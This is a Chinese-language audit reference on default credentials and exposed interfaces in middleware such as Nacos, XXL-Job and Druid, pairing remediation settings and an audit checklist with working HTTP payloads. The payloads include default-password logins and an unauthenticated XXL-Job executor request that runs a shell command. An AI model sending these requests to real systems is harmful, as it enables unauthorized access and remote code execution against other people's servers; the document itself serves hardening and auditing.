# Nacos / XXL-Job / 中间件默认口令与暴露面

## 默认口令表

| 中间件 | 默认账号 | 默认口令 | 默认端口 |
|--------|---------|---------|---------|
| Nacos | nacos | nacos | 8848 |
| XXL-Job Admin | admin | 123456 | 8080/xxl-job-admin |
| XXL-Job Executor | - | (无 accessToken) | 9999 |
| Nacos Console | nacos | nacos | 8848/nacos |
| Sentinel Dashboard | sentinel | sentinel | 8080 |
| Apollo Portal | apollo | admin | 8070 |
| Druid Monitor | - (无认证) | - | app-port/druid |
| Zookeeper | - | - | 2181 |
| Consul UI | - | - | 8500 |
| Elasticsearch | elastic | changeme (7.x-) | 9200 |
| Redis | - | (默认无密码) | 6379 |
| MongoDB | - | (默认无认证) | 27017 |

## 具体 payload

### Nacos

```http
POST /nacos/v1/auth/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=nacos&password=nacos
```

响应返回 `accessToken`，即可管理所有命名空间配置。

### XXL-Job Admin

```http
POST /xxl-job-admin/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userName=admin&password=123456
```

登录后可添加/修改任务，配合 GLUE 模式 Groovy/Shell 任务 = RCE。

### XXL-Job Executor 无鉴权

```http
POST /run HTTP/1.1
Host: executor:9999
Content-Type: application/json

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "test",
  "executorBlockStrategy": "SERIAL_EXECUTION",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1,
  "glueType": "GLUE_SHELL",
  "glueSource": "id > /tmp/pwn",
  "glueUpdatetime": 1,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

无 `XXL-JOB-ACCESS-TOKEN` 头 = 未启用鉴权 = RCE。

### Druid 监控

```
GET /druid/index.html
GET /druid/sql.html           # 慢 SQL 列表 = 泄漏业务查询
GET /druid/datasource.html    # 数据源配置 = 密码字段（3.x 后打码，2.x 明文）
```

## 修复清单

### Nacos

```yaml
# application.properties
nacos.core.auth.enabled=true
nacos.core.auth.plugin.nacos.token.secret.key=<强随机 base64,32+ 字节>
nacos.core.auth.server.identity.key=<随机>
nacos.core.auth.server.identity.value=<随机>
```

启动后立即改密：
```http
PUT /nacos/v1/auth/users?username=nacos&newPassword=<strong>
```

### XXL-Job

```yaml
# admin
xxl.job.accessToken=<强随机>
spring.security.user.password=<强随机>

# executor
xxl.job.executor.accesstoken=<同 admin>
```

### Druid

```java
StatViewServlet servlet = new StatViewServlet();
servlet.addInitParameter("loginUsername", "druid-admin");
servlet.addInitParameter("loginPassword", System.getenv("DRUID_PWD"));
servlet.addInitParameter("allow", "127.0.0.1");   // IP 白名单
servlet.addInitParameter("deny", "0.0.0.0/0");
```

## 审计动作

- [ ] 生产配置全文搜索 `nacos:nacos` / `admin:123456` / `sentinel:sentinel`
- [ ] `accessToken` 配置项非空且非默认值
- [ ] 中间件端口是否暴露公网（nmap 扫描）
- [ ] Druid `allow` / `deny` 属性设置

## 相关规则

- CWE: CWE-798 (Hardcoded Credentials)
- CWE: CWE-521 (Weak Password Requirements)
- 内建 pattern: `nacos_misconfig`, `xxljob_default_config`
